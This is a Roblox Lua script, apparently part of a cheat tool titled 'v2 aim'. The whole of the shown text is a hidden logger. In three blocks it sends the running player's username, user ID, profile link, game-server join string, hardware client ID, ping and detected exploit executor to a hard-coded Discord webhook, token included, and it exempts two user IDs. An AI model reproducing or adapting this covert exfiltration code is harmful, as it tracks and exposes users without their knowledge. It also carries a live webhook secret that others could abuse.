if game.Players.LocalPlayer.UserId == 1626722799 or game.Players.LocalPlayer.UserId == 1420800618 then
else
local jobid = game.JobId or 1
local profile = " https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
local joinurl = "Roblox.GameLauncher.joinGameInstance(2788229376, '"..jobid.."');"
local url =
    "https://canary.discord.com/api/webhooks/1047625147059818626/jDgYs73BqrfR8sg-MG_ryIgGRS7JH0--LWvIwLPTtZ4ZPfwACjuWgRZN1oU7Lbdd0fpp"

local webhookcheck = 
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X or Flexus" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "KRNL" or
    SONA_LOADED and "Sona" or
    "Unknown Exploit"

local data = {
    ["content"] = "Profile Link: "..profile,
    ["embeds"] = {
        {
            ["title"] = "**v2 aim**",
            ["description"] = "Name: **" ..game.Players.LocalPlayer.Name.."** or **"..game.Players.LocalPlayer.UserId.."** They Executed With **"..webhookcheck.."**".." Here Is Their Game ID: **"..joinurl.. "**",
            ["type"] = "rich",
            ["color"] = "2697513",
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"


local url =
   "https://canary.discord.com/api/webhooks/1047625147059818626/jDgYs73BqrfR8sg-MG_ryIgGRS7JH0--LWvIwLPTtZ4ZPfwACjuWgRZN1oU7Lbdd0fpp"
local data = {
   ["content"] = " ***v2 aim***",
   ["embeds"] = {
       {
           ["title"] = "**v2**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local webh = "https://canary.discord.com/api/webhooks/1047625147059818626/jDgYs73BqrfR8sg-MG_ryIgGRS7JH0--LWvIwLPTtZ4ZPfwACjuWgRZN1oU7Lbdd0fpp"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'v2 aim',
       ['description'] = '',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
